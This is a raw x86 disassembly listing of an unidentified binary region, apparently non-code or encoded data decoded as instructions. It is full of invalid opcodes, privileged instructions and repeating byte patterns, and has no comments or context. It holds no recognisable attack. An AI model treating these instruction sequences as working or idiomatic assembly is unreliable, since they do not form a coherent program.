  4078b8:	call   0x1ff0248e
  4078bd:	inc    ecx
  4078be:	(bad)  
  4078c0:	shl    BYTE PTR [esi+0x50307b42],0xff
  4078c7:	call   0x95752110
  4078cc:	pop    ds
  4078cd:	and    eax,0x10c663f3
  4078d2:	inc    eax
  4078d3:	jnp    0x407894
  4078d5:	inc    ebx
  4078d6:	imul   BYTE PTR [ebx+0x25]
  4078d9:	inc    ecx
  4078da:	bound  eax,QWORD PTR [ebx+0x0]
  4078dd:	adc    BYTE PTR [eax+0x0],al
  4078e0:	add    eax,0x62410040
  4078e5:	inc    eax
  4078e6:	add    BYTE PTR [ebx-0x34],al
  4078e9:	inc    eax
  4078ea:	add    eax,0x78434040
  4078ef:	bound  eax,QWORD PTR [ecx+0x78]
  4078f2:	add    eax,0x62404043
  4078f7:	cmp    eax,0xc0fb48bf
  4078fc:	xor    DWORD PTR [ebp-0x3a4057fc],ebp
  407902:	jnp    0x407923
  407904:	dec    ecx
  407905:	clc    
  407906:	bound  edi,QWORD PTR [edi+edi*4-0x2d3f1e70]
  40790d:	ret    
  40790e:	adc    eax,0x7bf92415
  407913:	pop    ds
  407914:	jl     0x407957
  407916:	inc    eax
  407917:	add    eax,0x43436240
  40791c:	add    eax,0x62004040
  407921:	inc    eax
  407922:	add    BYTE PTR [ecx+0x40],al
  407925:	inc    ebx
  407926:	test   BYTE PTR ds:0x58054041,ah
  40792c:	inc    eax
  40792d:	inc    eax
  40792e:	bound  eax,QWORD PTR [eax+0x66]
  407931:	inc    ecx
  407932:	inc    eax
  407933:	add    eax,0xc9a96000
  407938:	(bad)
  40793b:	jge    0x407953
  40793d:	sub    BYTE PTR [eax+0x7beacd41],0x1f
  407944:	dec    esp
  407945:	cli    
  407946:	or     DWORD PTR [edx+0x7d3ba840],eax
  40794c:	xor    ch,BYTE PTR [edi+ebp*1]
  40794f:	ret    
  407950:	sub    dl,BYTE PTR [ecx]
  407952:	jnp    0x407973
  407954:	jle    0x407943
  407956:	push   0x214849bc
  40795b:	shr    BYTE PTR [edi-0x9],0xcb
  40795f:	adc    eax,0x1f7b41d8
  407964:	push   esi
  407965:	add    BYTE PTR [eax],al
  407967:	inc    ebx
  407968:	inc    eax
  407969:	bound  eax,QWORD PTR ds:0x25404110
  40796f:	add    ah,cl
  407971:	inc    ebx
  407972:	add    eax,0x40402562
  407977:	add    BYTE PTR [eax+0x40],al
  40797a:	inc    ecx
  40797b:	inc    ecx
  40797c:	add    eax,0x78434025
  407981:	bound  eax,QWORD PTR [eax-0x7c]
  407984:	inc    eax
  407985:	inc    ecx
  407986:	std    
  407987:	dec    ecx
  407988:	retf   
  407989:	mov    eax,0x7c560804
  40798e:	sbb    al,0xc7
  407990:	add    DWORD PTR [edx-0x14],esp
  407993:	jnp    0x407952
  407995:	mov    esi,0x2854de7b
  40799a:	inc    edx
  40799b:	fs das 
  40799d:	mov    edi,0x7bc94c6e
  4079a2:	leave  
  4079a3:	jp     0x4079c4
  4079a5:	inc    eax
  4079a6:	hlt    
  4079a7:	add    eax,0xa9482526
  4079ac:	dec    eax
  4079ad:	inc    eax
  4079ae:	dec    ebp
  4079af:	retf   
  4079b0:	dec    esp
  4079b1:	bound  edx,QWORD PTR ds:0x4040417a
  4079b7:	inc    ebx
  4079b8:	int3   
  4079b9:	add    BYTE PTR ds:0x56240,al
  4079bf:	inc    ebx
  4079c0:	inc    eax
  4079c1:	inc    eax
  4079c2:	add    BYTE PTR [ecx+0x62],al
  4079c5:	bound  eax,QWORD PTR [eax]
  4079c7:	int3   
  4079c8:	inc    eax
  4079c9:	inc    ebx
  4079ca:	add    eax,0x43624041
  4079cf:	adc    BYTE PTR [ecx+0x5],al
  4079d2:	inc    eax
  4079d3:	push   esp
  4079d4:	loopne 0x407997
  4079d6:	es dec ebp
  4079d8:	mov    eax,0x5ebff4cb
  4079dd:	sbb    ebx,ecx
  4079df:	hlt    
  4079e0:	addr16 inc edx
  4079e2:	inc    eax
  4079e3:	ss mov esi,0xfd7065f3
  4079e9:	pop    edx
  4079ea:	inc    eax
  4079eb:	(bad)  
  4079ec:	into   
  4079ed:	jge    0x407a65
  4079ef:	cmp    BYTE PTR [eax+ebx*8+0x57d87140],0xc4
  4079f7:	pop    edx
  4079f8:	push   ss
  4079f9:	and    eax,0x8735412c
  4079fe:	mov    eax,0x621fcd32
  407a03:	inc    ebx
  407a04:	inc    eax
  407a05:	adc    BYTE PTR ds:0x4158cc40,al
  407a0b:	inc    ebx
  407a0c:	bound  eax,QWORD PTR [ecx+0x40]
  407a0f:	add    eax,0x4140
  407a14:	and    eax,0x40400062
  407a19:	add    eax,0x84404340
  407a1e:	int3   
  407a1f:	js     0x407a21
  407a21:	inc    ecx
  407a22:	adc    BYTE PTR [edx+0xf],ah
  407a25:	inc    eax
  407a26:	xchg   edi,eax
  407a27:	(bad)  
  407a28:	xchg   edi,eax
  407a29:	in     al,dx
  407a2a:	in     al,0xdc
  407a2c:	test   al,0x40
  407a2e:	dec    ebp
  407a2f:	inc    eax
  407a30:	call   0x11db4a9a
  407a35:	push   eax
  407a36:	push   ecx
  407a37:	gs hlt 
  407a39:	stc    
  407a3a:	test   ecx,0x402440ac
  407a40:	lock add BYTE PTR [edi+0x53],cl
  407a44:	or     eax,0x904b5f40
  407a49:	bound  edi,QWORD PTR [edi+0x414000ce]
  407a4f:	inc    eax
  407a50:	inc    ebx
  407a51:	bound  ax,DWORD PTR ds:0x40434100
  407a58:	add    eax,0x40054062
  407a5d:	bound  eax,QWORD PTR [ecx+0x40]
  407a60:	inc    ebx
  407a61:	inc    eax
  407a62:	add    eax,0x25405841
  407a67:	bound  eax,QWORD PTR [eax+0x43]
  407a6a:	inc    eax
  407a6b:	adc    bl,cl
  407a6d:	inc    eax
  407a6e:	inc    esp
  407a6f:	rcr    al,1
  407a71:	sar    DWORD PTR [edi-0x8bfbb70],1
  407a77:	add    al,0x62
  407a79:	jl     0x407a32
  407a7b:	data16 add al,BYTE PTR [eax+0x60]
  407a7f:	inc    edx
  407a80:	imul   esp,DWORD PTR [ebx-0x21],0x5340c94e
  407a87:	xor    BYTE PTR [ecx-0x532757ea],bl
  407a8d:	inc    eax
  407a8e:	cmp    al,0x3
  407a90:	mov    esp,ebx
  407a92:	add    al,0x25
  407a94:	dec    eax
  407a95:	inc    eax
  407a96:	and    BYTE PTR [ebx-0x28],cl
  407a99:	inc    eax
  407a9a:	inc    ecx
  407a9b:	inc    ebx
  407a9c:	inc    eax
  407a9d:	add    eax,0x43406262
  407aa2:	inc    ecx
  407aa3:	adc    BYTE PTR [eax],al
  407aa5:	inc    eax
  407aa6:	add    eax,0x43000562
  407aab:	add    BYTE PTR [ecx+0x40],al
  407aae:	inc    eax
  407aaf:	add    eax,0x400062
  407ab4:	inc    ebx
  407ab5:	inc    eax
  407ab6:	js     0x407af9
  407ab8:	inc    ecx
  407ab9:	bound  eax,QWORD PTR [eax+0x64]
  407abc:	inc    edi
  407abd:	je     0x407b08
  407abf:	inc    eax
  407ac0:	sbb    DWORD PTR [ebp+0x626ebc1e],esi
  407ac6:	enter  0x2040,0x29
  407aca:	sahf   
  407acb:	inc    eax
  407acc:	and    BYTE PTR [eax+0x3],dl
  407acf:	inc    eax
  407ad0:	pop    ds
  407ad1:	adc    DWORD PTR [ecx+0x14365d1],edi
  407ad7:	inc    eax
  407ad8:	inc    eax
  407ad9:	pop    ecx
  407ada:	dec    esi
  407adb:	imul   esi,DWORD PTR [eax],0x9140c535
  407ae1:	icebp  
  407ae2:	mov    cs,WORD PTR [edi-0x27]
  407ae5:	arpl   WORD PTR [eax+eax*2-0x57dea1df],bp
  407aec:	jmp    0x407b50
  407aee:	inc    eax
  407aef:	add    eax,0x40430041
  407af4:	inc    eax
  407af5:	inc    ecx
  407af6:	inc    eax
  407af7:	inc    eax
  407af8:	bound  eax,QWORD PTR ds:0x5624300
  407afe:	add    BYTE PTR [eax+0x40],al
  407b01:	add    BYTE PTR [ecx+0x43],al
  407b04:	add    BYTE PTR [eax+0x41],al
  407b07:	add    eax,0x40436200
  407b0c:	inc    eax
  407b0d:	add    eax,0x409ba862
  407b12:	aaa    
  407b13:	mov    cl,0xa4
  407b15:	mov    ah,0x59
  407b17:	adc    ecx,esp
  407b19:	inc    eax
  407b1a:	and    eax,0xf2a2dfef
  407b1f:	mov    esp,0xd734062
  407b24:	stc    
  407b25:	bound  ecx,QWORD PTR [edx+0x41]
  407b28:	cld    
  407b29:	inc    eax
  407b2a:	and    esp,esi
  407b2c:	es (bad) 
  407b2e:	push   edx
  407b2f:	and    BYTE PTR [eax+eax*2],ch
  407b32:	mov    bl,0x69
  407b34:	xchg   esp,eax
  407b35:	dec    eax
  407b36:	add    al,0x41
  407b38:	inc    eax
  407b39:	add    eax,0x41624340
  407b3e:	test   BYTE PTR [eax],al
  407b40:	and    eax,0x404043
  407b45:	add    BYTE PTR ds:0x626210,al
  407b4b:	add    eax,0x43404140
  407b50:	inc    eax
  407b51:	inc    ecx
  407b52:	add    eax,0x10664062
  407b57:	inc    ebx
  407b58:	bound  ebp,QWORD PTR [eax+0x62]
  407b5b:	inc    eax
  407b5c:	dec    eax
  407b5d:	inc    ecx
  407b5e:	dec    ecx
  407b5f:	arpl   bp,cx
  407b61:	bound  edi,QWORD PTR [ebp+0x40]
  407b64:	xchg   ecx,eax
  407b65:	lock pusha 
  407b67:	push   esp
  407b68:	mov    esp,0x5f40a83f
  407b6d:	addr16 das 
  407b6f:	or     eax,0x4011e815
  407b74:	adc    eax,0xcbcbc540
  407b79:	arpl   WORD PTR [ebp+0x40],cx
  407b7c:	mov    edi,0x4041cc05
  407b81:	add    BYTE PTR [eax],al
  407b83:	add    BYTE PTR [eax+0x40],al
  407b86:	inc    ebx
  407b87:	bound  eax,QWORD PTR [eax]
  407b89:	inc    eax
  407b8a:	inc    eax
  407b8b:	add    eax,0x62434162
  407b90:	inc    eax
  407b91:	js     0x407ba3
  407b93:	inc    ecx
  407b94:	add    eax,0x5404325
  407b99:	bound  eax,QWORD PTR [eax+0x40]
  407b9c:	inc    ecx
  407b9d:	inc    ebx
  407b9e:	pusha  
  407b9f:	repz push edi
  407ba1:	sbb    al,0x58
  407ba3:	xchg   DWORD PTR [eax-0x31],eax
  407ba6:	dec    eax
  407ba7:	pop    ss
  407ba8:	stos   DWORD PTR es:[edi],eax
  407ba9:	xor    al,0x15
  407bab:	jae    0x407bed
  407bad:	xor    DWORD PTR [ebx],esi
  407baf:	sub    BYTE PTR [edx+0x40],al
  407bb2:	pusha  
  407bb3:	inc    eax
  407bb4:	inc    eax
  407bb5:	inc    ecx
  407bb6:	popa   
  407bb7:	cmc    
  407bb8:	or     al,0xbc
  407bba:	xlat   BYTE PTR ss:[ebx]
  407bbc:	inc    eax
  407bbd:	push   ebp
  407bbe:	mov    bl,0x65
  407bc0:	cld    
  407bc1:	cmp    eax,0x4240d162
  407bc6:	jecxz  0x407b51
  407bc8:	vaddsd xmm4,xmm7,QWORD PTR [edx+0x40]
  407bcd:	repnz inc edx
  407bcf:	dec    esp
  407bd0:	and    eax,0x436241
  407bd5:	adc    BYTE PTR [eax+0x0],al
  407bd8:	add    eax,0x62410040
  407bdd:	inc    eax
  407bde:	add    BYTE PTR [ebx-0x34],al
  407be1:	inc    eax
  407be2:	add    eax,0x78434040
  407be7:	bound  eax,QWORD PTR [ecx+0x78]
  407bea:	add    eax,0x62404043
  407bef:	dec    edx
  407bf0:	dec    edx
  407bf1:	pusha  
  407bf2:	addr16 inc eax
  407bf4:	cs icebp 
  407bf6:	pusha  
  407bf7:	int    0x41
  407bf9:	inc    ecx
  407bfa:	cmp    al,0x40
  407bfc:	gs push ebp
  407bfe:	mov    BYTE PTR [eax-0x14],0x62
  407c02:	arpl   WORD PTR [eax-0x2f],ax
  407c05:	sbb    eax,0x345530fe
  407c0a:	adc    BYTE PTR [eax+0x5d],al
  407c0d:	out    0x4b,al
  407c0f:	addr16 test al,0x8
  407c12:	dec    eax
  407c13:	inc    eax
  407c14:	icebp  
  407c15:	push   ss
  407c16:	push   eax
  407c17:	je     0x407c2a
  407c19:	dec    esp
  407c1a:	inc    ecx
  407c1b:	inc    eax
  407c1c:	add    eax,0x43436240
  407c21:	add    eax,0x62004040
  407c26:	inc    eax
  407c27:	add    BYTE PTR [ecx+0x40],al
  407c2a:	inc    ebx
  407c2b:	test   BYTE PTR ds:0x58054041,ah
  407c31:	inc    eax
  407c32:	inc    eax
  407c33:	bound  eax,QWORD PTR [eax+0x66]
  407c36:	inc    ecx
  407c37:	inc    eax
  407c38:	add    eax,0x6e400200
  407c3d:	das    
  407c3e:	push   eax
  407c3f:	test   al,0x94
  407c41:	xchg   DWORD PTR ss:[eax+0x73],eax
  407c45:	adc    cl,BYTE PTR ss:[di]
  407c49:	add    DWORD PTR [ecx+0x40],eax
  407c4c:	ds cmp al,0x42
  407c4f:	mov    al,0x42
  407c51:	test   al,0xdd
  407c53:	inc    eax
  407c54:	xor    ebp,DWORD PTR [eax+0x1]
  407c57:	inc    ecx
  407c58:	inc    ecx
  407c59:	adc    BYTE PTR [eax+eax*2],ch
  407c5c:	scas   eax,DWORD PTR es:[edi]
  407c5d:	inc    ebx
  407c5e:	jmp    0x4140:0x35bc8c40
  407c65:	xchg   ecx,eax
  407c66:	add    BYTE PTR [eax],al
  407c68:	inc    ebx
  407c69:	inc    eax
  407c6a:	bound  eax,QWORD PTR ds:0x25404110
  407c70:	add    ah,cl
  407c72:	inc    ebx
  407c73:	add    eax,0x40402562
  407c78:	add    BYTE PTR [eax+0x40],al
  407c7b:	inc    ecx
  407c7c:	inc    ecx
  407c7d:	add    eax,0x78434025
  407c82:	bound  eax,QWORD PTR [eax-0x7c]
  407c85:	inc    eax
  407c86:	inc    ecx
  407c87:	adc    BYTE PTR [eax],dh
  407c89:	popa   
  407c8a:	inc    ecx
  407c8b:	test   BYTE PTR [eax-0x6f],al
  407c8e:	add    eax,DWORD PTR [ebp+0x68]
  407c91:	test   al,0x7d
  407c93:	bound  eax,QWORD PTR [eax+0x59]
  407c96:	icebp  
  407c97:	xor    DWORD PTR [edi+0x10],edx
  407c9a:	cmp    al,0x3d
  407c9c:	inc    eax
  407c9d:	jno    0x407c4a
  407c9f:	jl     0x407cd6
  407ca1:	pushf  
  407ca2:	push   eax
  407ca3:	enter  0x1e40,0x67
  407ca7:	popf   
  407ca8:	sub    al,0x5
  407caa:	pop    es
  407cab:	inc    ecx
  407cac:	inc    eax
  407cad:	inc    eax
  407cae:	inc    ebx
  407caf:	int3   
  407cb0:	add    BYTE PTR ds:0x56240,al
  407cb6:	inc    ebx
  407cb7:	inc    eax
  407cb8:	inc    eax
  407cb9:	add    BYTE PTR [ecx+0x62],al
  407cbc:	bound  eax,QWORD PTR [eax]
  407cbe:	int3   
  407cbf:	inc    eax
  407cc0:	inc    ebx
  407cc1:	add    eax,0x43624041
  407cc6:	adc    BYTE PTR [ecx+0x5],al
  407cc9:	inc    eax
  407cca:	pusha  
  407ccb:	inc    eax
  407ccc:	rcl    DWORD PTR [eax+0x4d],1
  407ccf:	mov    dh,0xcb
  407cd1:	adc    DWORD PTR [edx],eax
  407cd3:	inc    eax
  407cd4:	pop    ebp
  407cd5:	xor    eax,0x6344613c
  407cda:	leave  
  407cdb:	inc    eax
  407cdc:	push   ebp
  407cdd:	jne    0x407c68
  407cdf:	pusha  
  407ce0:	inc    esp
  407ce1:	jp     0x407c9f
  407ce3:	inc    eax
  407ce4:	bound  edx,QWORD PTR [ecx+0x465363ea]
  407cea:	add    eax,0x4a5b7240
  407cef:	adc    eax,ecx
  407cf1:	fld    DWORD PTR [edx+0x40]
  407cf4:	xor    dh,BYTE PTR [edi+0x426da80c]
  407cfa:	inc    ebx
  407cfb:	inc    eax
  407cfc:	pop    esp
  407cfd:	bound  eax,QWORD PTR [ebx+0x40]
  407d00:	adc    BYTE PTR ds:0x4158cc40,al
  407d06:	inc    ebx
  407d07:	bound  eax,QWORD PTR [ecx+0x40]
  407d0a:	add    eax,0x4140
  407d0f:	and    eax,0x40400062
  407d14:	add    eax,0x84404340
  407d19:	int3   
  407d1a:	js     0x407d1c
  407d1c:	inc    ecx
  407d1d:	adc    BYTE PTR [edx+0xf],ah
  407d20:	adc    BYTE PTR [edi],bl
  407d22:	adc    ch,BYTE PTR [eax+0x71402830]
  407d28:	xor    eax,0x8412a473
  407d2d:	pop    esp
  407d2e:	inc    eax
  407d2f:	pop    ecx
  407d30:	push   es
  407d31:	inc    ebx
  407d32:	inc    ecx
  407d33:	mov    al,ds:0x41400007
  407d38:	inc    eax
  407d39:	inc    ebx
  407d3a:	bound  ax,DWORD PTR ds:0x40434100
  407d41:	add    eax,0x40054062
  407d46:	bound  eax,QWORD PTR [ecx+0x40]
  407d49:	inc    ebx
  407d4a:	inc    eax
  407d4b:	add    eax,0x25405841
  407d50:	bound  eax,QWORD PTR [eax+0x43]
  407d53:	inc    eax
  407d54:	adc    BYTE PTR [eax],cl
  407d56:	inc    eax
  407d57:	pop    ebp
  407d58:	jae    0x407db7
  407d5a:	aas    
  407d5b:	adc    eax,0xbb40c921
  407d60:	jecxz  0x407d07
  407d62:	lods   al,BYTE PTR ds:[esi]
  407d63:	retf   
  407d64:	bound  edi,QWORD PTR [eax+0x4911d40]
  407d6a:	bound  edi,QWORD PTR [esi+ecx*1+0x45d34041]
  407d71:	inc    esp
  407d72:	or     eax,0x40f16944
  407d77:	pop    ecx
  407d78:	xchg   edi,eax
  407d79:	ins    DWORD PTR es:[edi],dx
  407d7a:	retf   
  407d7b:	push   ebp
  407d7c:	sar    eax,1
  407d7e:	inc    eax
  407d7f:	xchg   ecx,eax
  407d80:	inc    eax
  407d81:	inc    ecx
  407d82:	inc    ebx
  407d83:	inc    eax
  407d84:	add    eax,0x43406262
  407d89:	inc    ecx
  407d8a:	adc    BYTE PTR [eax],al
  407d8c:	inc    eax
  407d8d:	add    eax,0x43000562
  407d92:	add    BYTE PTR [ecx+0x40],al
  407d95:	inc    eax
  407d96:	add    eax,0x400062
  407d9b:	inc    ebx
  407d9c:	inc    eax
  407d9d:	js     0x407de0
  407d9f:	inc    ecx
  407da0:	bound  eax,QWORD PTR [eax-0x1]
  407da3:	xor    edx,DWORD PTR [eax]
  407da5:	int3   
  407da6:	arpl   WORD PTR ds:0x9a456540,dx
  407dac:	push   esp
  407dad:	mov    esp,0x3340c94c
  407db2:	lahf   
  407db3:	and    BYTE PTR ds:0x4060240d,al
  407db9:	pop    edx
  407dba:	push   edx
  407dbb:	clc    
  407dbc:	retf   
  407dbd:	retf   
  407dbe:	push   ebx
  407dbf:	adc    DWORD PTR [eax+0x75],eax
  407dc2:	sahf   
  407dc3:	nop
  407dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dc5:	nop
  407dc6:	stos   DWORD PTR es:[edi],eax
  407dc7:	retf   
  407dc8:	inc    eax
  407dc9:	inc    bp
  407dcb:	in     eax,dx
  407dcc:	add    eax,0x4048c3bf
  407dd1:	stc    
  407dd2:	mov    edi,0x6270c927
  407dd7:	inc    eax
  407dd8:	add    eax,0x40430041
  407ddd:	inc    eax
  407dde:	inc    ecx
  407ddf:	inc    eax
  407de0:	inc    eax
  407de1:	bound  eax,QWORD PTR ds:0x5624300
  407de7:	add    BYTE PTR [eax+0x40],al
  407dea:	add    BYTE PTR [ecx+0x43],al
  407ded:	add    BYTE PTR [eax+0x41],al
  407df0:	add    eax,0x40436200
  407df5:	inc    eax
  407df6:	add    eax,0x40437e62
  407dfb:	push   0x46c869
  407e00:	bound  edx,QWORD PTR [edi+0x6503140]
  407e06:	dec    edx
  407e07:	inc    esp
  407e08:	sti    
  407e09:	add    al,0x40
  407e0b:	inc    edx
  407e0c:	inc    ecx
  407e0d:	inc    eax
  407e0e:	add    eax,0x41624340
  407e13:	test   BYTE PTR [eax],al
  407e15:	and    eax,0x404043
  407e1a:	add    BYTE PTR ds:0x626210,al
  407e20:	add    eax,0x43404140
  407e25:	inc    eax
  407e26:	inc    ecx
  407e27:	add    eax,0x10664062
  407e2c:	inc    ebx
  407e2d:	bound  esi,QWORD PTR [ebx-0x6bba238c]
  407e33:	bound  eax,QWORD PTR [eax-0x6f]
  407e36:	mov    ebp,DWORD PTR [esi]
  407e38:	pop    ss
  407e39:	xor    BYTE PTR [ebx-0x37],ah
  407e3c:	inc    eax
  407e3d:	dec    edx
  407e3e:	cmp    DWORD PTR [ecx+0x5c532438],ebx
  407e44:	inc    eax
  407e45:	adc    DWORD PTR [edx-0x5757d344],eax
  407e4b:	add    al,BYTE PTR [eax-0x41]
  407e4e:	mov    al,0x3
  407e50:	push   ss
  407e51:	adc    ah,ah
  407e53:	jo     0x407e95
  407e55:	inc    ecx
  407e56:	pusha  
  407e57:	add    eax,0x4041cc
  407e5c:	add    BYTE PTR [eax],al
  407e5e:	inc    eax
  407e5f:	inc    eax
  407e60:	inc    ebx
  407e61:	bound  eax,QWORD PTR [eax]
  407e63:	inc    eax
  407e64:	inc    eax
  407e65:	add    eax,0x62434162
  407e6a:	inc    eax
  407e6b:	js     0x407e7d
  407e6d:	inc    ecx
  407e6e:	add    eax,0x5404325
  407e73:	bound  eax,QWORD PTR [eax+0x40]
  407e76:	inc    ecx
  407e77:	inc    ebx
  407e78:	sub    DWORD PTR [ecx+eax*1+0x26],esp
  407e7c:	aas    
  407e7d:	inc    eax
  407e7e:	shr    BYTE PTR [esi+0x1c5489a9],1
  407e84:	push   eax
  407e85:	inc    eax
  407e86:	add    DWORD PTR [edx+ebp*1+0x68],eax
  407e8a:	int    0xfc
  407e8c:	or     BYTE PTR [eax+0x40],al
  407e8f:	aas    
  407e90:	xchg   ebx,eax
  407e91:	arpl   WORD PTR [eax+0x5140c962],di
  407e97:	inc    esp
  407e98:	xchg   esi,eax
  407e99:	inc    edx
  407e9a:	or     eax,0x7140b055
  407e9f:	aas    
  407ea0:	mov    ah,0x30
  407ea2:	retf   
  407ea3:	xor    al,0xd
  407ea5:	inc    eax
  407ea6:	jg     0x407ecd
  407ea8:	inc    ecx
  407ea9:	bound  eax,QWORD PTR [ebx+0x0]
  407eac:	adc    BYTE PTR [eax+0x0],al
  407eaf:	add    eax,0x62410040
  407eb4:	inc    eax
  407eb5:	add    BYTE PTR [ebx-0x34],al
  407eb8:	inc    eax
  407eb9:	add    eax,0x78434040
  407ebe:	bound  eax,QWORD PTR [ecx+0x78]
  407ec1:	add    eax,0x62404043
  407ec6:	jbe    0x407e83
  407ec8:	push   eax
  407ec9:	mov    esp,0x7140cb5f
  407ece:	(bad)  
  407ed0:	mov    ecx,0x4043d205
  407ed5:	jg     0x407f23
  407ed7:	xchg   ecx,eax
  407ed8:	inc    edx
  407ed9:	retf   
  407eda:	push   edx
  407edb:	xchg   edi,eax
  407edc:	inc    eax
  407edd:	jno    0x407e7e
  407edf:	test   dl,dl
  407ee1:	adc    bl,BYTE PTR [esp+esi*1]
  407ee4:	inc    eax
  407ee5:	jg     0x407f5e
  407ee7:	sub    eax,0x42b494da
  407eec:	inc    eax
  407eed:	jno    0x407ee4
  407eef:	jge    0x407f19
  407ef1:	adc    eax,0x7f4086a8
  407ef6:	jg     0x407e90
  407ef8:	xchg   ecx,eax
  407ef9:	retf   
  407efa:	xor    DWORD PTR [eax+eax*2+0x5404148],edi
  407f01:	inc    eax
  407f02:	bound  eax,QWORD PTR [ebx+0x43]
  407f05:	add    eax,0x62004040
  407f0a:	inc    eax
  407f0b:	add    BYTE PTR [ecx+0x40],al
  407f0e:	inc    ebx
  407f0f:	test   BYTE PTR ds:0x58054041,ah
  407f15:	inc    eax
  407f16:	inc    eax
  407f17:	bound  eax,QWORD PTR [eax+0x66]
  407f1a:	inc    ecx
  407f1b:	inc    eax
  407f1c:	add    eax,0x16d5f600
  407f21:	adc    DWORD PTR [edx*1-0x688060c0],esi
  407f28:	in     eax,0xa1
  407f2a:	inc    edx
  407f2b:	inc    ebx
  407f2c:	inc    eax
  407f2d:	(bad)  
  407f2e:	dec    DWORD PTR [edx]
  407f30:	arpl   WORD PTR [ecx+0x4940b86b],dx
  407f36:	sbb    DWORD PTR [edi+0x43f4b077],ebx
  407f3c:	inc    eax
  407f3d:	pop    ds
  407f3e:	mov    esi,0x430000e5
  407f43:	inc    eax
  407f44:	bound  eax,QWORD PTR ds:0x25404110
  407f4a:	add    ah,cl
  407f4c:	inc    ebx
  407f4d:	add    eax,0x40402562
  407f52:	add    BYTE PTR [eax+0x40],al
  407f55:	inc    ecx
  407f56:	inc    ecx
  407f57:	add    eax,0x78434025
  407f5c:	bound  eax,QWORD PTR [eax-0x7c]
  407f5f:	inc    eax
  407f60:	inc    ecx
  407f61:	fs or  eax,0x71409762
  407f67:	arpl   WORD PTR [ecx],ax
  407f69:	bound  eax,QWORD PTR [ebx+0x40]
  407f6c:	and    BYTE PTR [eax+0x7f],al
  407f6f:	adc    edx,DWORD PTR [ecx+edx*2+0x40626740]
  407f76:	push   esp
  407f77:	ins    DWORD PTR es:[edi],dx
  407f78:	sti    
  407f79:	dec    esi
  407f7a:	inc    ebp
  407f7b:	inc    ecx
  407f7c:	leave  
  407f7d:	inc    eax
  407f7e:	cmc    
  407f7f:	push   esp
  407f80:	jo     0x407f2a
  407f82:	xor    BYTE PTR [edx+0x42],ah
  407f85:	inc    eax
  407f86:	cs adc al,0xa2
  407f89:	ret    0x67b0
  407f8c:	add    DWORD PTR [eax-0x69],0x3d33e371
  407f93:	inc    ecx
  407f94:	inc    eax
  407f95:	inc    eax
  407f96:	inc    ebx
  407f97:	int3   
  407f98:	add    BYTE PTR ds:0x56240,al
  407f9e:	inc    ebx
  407f9f:	inc    eax
  407fa0:	inc    eax
  407fa1:	add    BYTE PTR [ecx+0x62],al
  407fa4:	bound  eax,QWORD PTR [eax]
  407fa6:	int3   
  407fa7:	inc    eax
  407fa8:	inc    ebx
  407fa9:	add    eax,0x43624041
  407fae:	adc    BYTE PTR [ecx+0x5],al
  407fb1:	inc    eax
  407fb2:	cmp    bl,al
  407fb4:	inc    eax
  407fb5:	dec    edx
  407fb6:	xchg   ecx,eax
  407fb7:	cld    
  407fb8:	push   es
  407fb9:	ret    
  407fba:	xor    BYTE PTR [eax+eax*2+0x4c404195],bh
  407fc1:	mov    esp,0x4940428c
  407fc6:	jno    0x407ffc
  407fc8:	bound  eax,QWORD PTR ds:0xb3402091
  407fce:	inc    esi
  407fcf:	jp     0x40800a
  407fd1:	leave  
  407fd2:	pop    eax
  407fd3:	cmp    BYTE PTR [eax+0x2d],al
  407fd6:	lock cmc 
  407fd8:	sbb    eax,0x4062d5ac
  407fdd:	mov    ah,0xe
  407fdf:	adc    DWORD PTR [edx+0x43],esp
  407fe2:	inc    eax
  407fe3:	adc    BYTE PTR ds:0x4158cc40,al
  407fe9:	inc    ebx
  407fea:	bound  eax,QWORD PTR [ecx+0x40]
  407fed:	add    eax,0x4140
  407ff2:	and    eax,0x40400062
  407ff7:	add    eax,0x84404340
  407ffc:	int3   
  407ffd:	js     0x407fff
  407fff:	inc    ecx
  408000:	adc    BYTE PTR [edx+0xf],ah
  408003:	test   eax,0x40706d05
  408008:	sub    eax,0x43648e27
  40800d:	pop    esp
  40800e:	add    BYTE PTR [eax-0x42],al
  408011:	xor    DWORD PTR ds:0xcb62bce4,ecx
  408017:	add    BYTE PTR [eax+0x41],al
  40801a:	inc    eax
  40801b:	inc    ebx
  40801c:	bound  ax,DWORD PTR ds:0x40434100
  408023:	add    eax,0x40054062
  408028:	bound  eax,QWORD PTR [ecx+0x40]
  40802b:	inc    ebx
  40802c:	inc    eax
  40802d:	add    eax,0x25405841
  408032:	bound  eax,QWORD PTR [eax+0x43]
  408035:	inc    eax
  408036:	adc    BYTE PTR [eax+0x2d],al
  408039:	popf   
  40803a:	repnz xlat BYTE PTR ds:[ebx]
  40803c:	add    eax,0xbb40bfd2
  408041:	imul   esp,DWORD PTR [ecx],0x27
  408044:	retf   
  408045:	out    0xbf,eax
  408047:	inc    eax
  408048:	jno    0x40807b
  40804a:	sbb    BYTE PTR [ebp-0x6e],dh
  40804d:	test   al,0x93
  40804f:	inc    eax
  408050:	fist   WORD PTR [ebp-0x45]
  408053:	bound  edi,QWORD PTR [edi+0x2340d7c8]
  408059:	adc    BYTE PTR [eax+eax*2+0x5404341],dl
  408060:	bound  esp,QWORD PTR [edx+0x40]
  408063:	inc    ebx
  408064:	inc    ecx
  408065:	adc    BYTE PTR [eax],al
  408067:	inc    eax
  408068:	add    eax,0x43000562
  40806d:	add    BYTE PTR [ecx+0x40],al
  408070:	inc    eax
  408071:	add    eax,0x400062
  408076:	inc    ebx
  408077:	inc    eax
  408078:	js     0x4080bb
  40807a:	inc    ecx
  40807b:	bound  eax,QWORD PTR [eax+0x41]
  40807e:	jo     0x4080af
  408080:	inc    esp
  408081:	inc    eax
  408082:	jg     0x408098
  408084:	or     al,0xf4
  408086:	adc    BYTE PTR [ebp-0x4f],ah
  408089:	inc    eax
  40808a:	cmovbe esp,DWORD PTR ds:0x38544d82
  408091:	inc    eax
  408092:	std    
  408093:	xor    cl,ah
  408095:	push   ss
  408096:	inc    ebp
  408097:	adc    eax,0x62094043
  40809c:	inc    eax
  40809d:	add    eax,0x40430041
  4080a2:	inc    eax
  4080a3:	inc    ecx
  4080a4:	inc    eax
  4080a5:	inc    eax
  4080a6:	bound  eax,QWORD PTR ds:0x5624300
  4080ac:	add    BYTE PTR [eax+0x40],al
  4080af:	add    BYTE PTR [ecx+0x43],al
  4080b2:	add    BYTE PTR [eax+0x41],al
  4080b5:	add    eax,0x40436200
  4080ba:	inc    eax
  4080bb:	add    eax,0xed931062
  4080c0:	xor    dh,dh
  4080c2:	mov    ds:0x3c40a840,al
